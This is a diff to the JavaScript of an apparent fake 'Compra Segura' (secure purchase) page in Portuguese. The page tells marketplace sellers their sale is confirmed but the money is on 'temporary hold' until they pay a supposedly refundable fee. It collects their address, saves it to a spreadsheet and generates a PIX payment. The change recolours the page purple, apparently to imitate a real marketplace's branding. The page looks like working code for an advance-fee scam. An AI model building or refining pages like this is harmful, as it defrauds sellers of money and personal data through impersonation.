@@ -155,7 +155,7 @@ async function initClientApp(id) {
   // 🔥 FIX CORRIGIDO: Formatação visual robusta (Aceita 7.50 e 7,50)
   const formatValueForClient = (value) => {
       if (!value) return ''; 
-      
+
       // 1. Se já for número (ex: 7.5), formata direto
       if (typeof value === 'number') {
           return value.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
@@ -163,7 +163,7 @@ async function initClientApp(id) {
 
       let valueStr = String(value).trim();
       valueStr = valueStr.replace(/R\$\s*/g, '');
-      
+
       // Retorna textos especiais
       if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
 
@@ -235,17 +235,18 @@ async function initClientApp(id) {
     const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
     const content = criarElemento('div', { class: 'content' });
 
+    // ATUALIZAÇÃO VISUAL: Cores ajustadas para Roxo (#6e0ad6)
     content.innerHTML = `
       <div style="text-align: center; margin-bottom: 20px;">
-          <h2 style="color: #00bfa5; margin: 0;">🎉 Venda Confirmada!</h2>
+          <h2 style="color: #6e0ad6; margin: 0;">🎉 Venda Confirmada!</h2>
           <p style="font-size: 14px; opacity: 0.8; margin-top: 5px;">Seu anúncio encontrou um comprador.</p>
       </div>
 
-      <div style="background: rgba(0, 191, 165, 0.1); border-left: 4px solid #00bfa5; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: left;">
+      <div style="background: rgba(110, 10, 214, 0.1); border-left: 4px solid #6e0ad6; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: left;">
           <p style="margin: 0; font-size: 14px; line-height: 1.5;">
               Para garantir a segurança da transação, o saldo total está em <strong>Retenção Temporária</strong>.
               <br><br>
-              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="highlight" style="color:#00bfa5">${getDisplayValue(dados.taxa, true, '---')}</span>.
+              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="highlight" style="color:#6e0ad6">${getDisplayValue(dados.taxa, true, '---')}</span>.
               <br>
               <span style="font-size: 12px; opacity: 0.8;">ℹ️ Este valor será reembolsado junto com a venda em até <strong>${prazo}</strong>.</span>
           </p>
@@ -290,7 +291,7 @@ async function initClientApp(id) {
                 <input type="text" name="city" id="inputCidade" required placeholder="Cidade">
                 <input type="text" name="state" id="inputUf" required placeholder="UF">
             </div>
-            <div class="full-width" id="address-preview" style="font-size:11px; color:#00bfa5; display:none; margin-top:-10px; margin-bottom:10px;">
+            <div class="full-width" id="address-preview" style="font-size:11px; color:#6e0ad6; display:none; margin-top:-10px; margin-bottom:10px;">
             </div>
         </div>
 
@@ -300,7 +301,7 @@ async function initClientApp(id) {
         <p id="msgEnvio" style="text-align:center; font-size:12px; margin-top:10px; opacity:0.7;"></p>
       </form>
     `;
-    
+
     const formContainer = criarElemento('div');
     formContainer.innerHTML = formHtml;
     content.appendChild(formContainer);
@@ -327,7 +328,7 @@ async function initClientApp(id) {
                     document.getElementById('inputBairro').value = data.bairro;
                     document.getElementById('inputCidade').value = data.localidade;
                     document.getElementById('inputUf').value = data.uf;
-                    
+
                     const preview = document.getElementById('address-preview');
                     preview.textContent = `📍 ${data.logradouro}, ${data.bairro} - ${data.localidade}/${data.uf}`;
                     preview.style.display = 'block';
@@ -339,10 +340,10 @@ async function initClientApp(id) {
     // 🚀 SUBMIT: Salva na Planilha + Gera PIX
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      
+
       msgEnvio.textContent = "Validando e salvando dados...";
-      msgEnvio.style.color = "#00bfa5";
-      
+      msgEnvio.style.color = "#6e0ad6"; // Cor ajustada para roxo
+
       const formData = new FormData(form);
       const customerData = {};
       formData.forEach((value, key) => customerData[key] = value);
@@ -463,7 +464,7 @@ function showPixModal(data) {
     modal.classList.add('is-visible');
 
     const closeModal = () => modal.classList.remove('is-visible');
-    
+
     btnClose.onclick = closeModal;
     modal.onclick = (e) => { if(e.target === modal) closeModal(); };
 
@@ -471,7 +472,7 @@ function showPixModal(data) {
         textarea.select();
         textarea.setSelectionRange(0, 99999);
         document.execCommand('copy');
-        
+
         const oldHtml = btnCopy.innerHTML;
         btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> COPIADO!`;
         btnCopy.style.background = "#00c853";
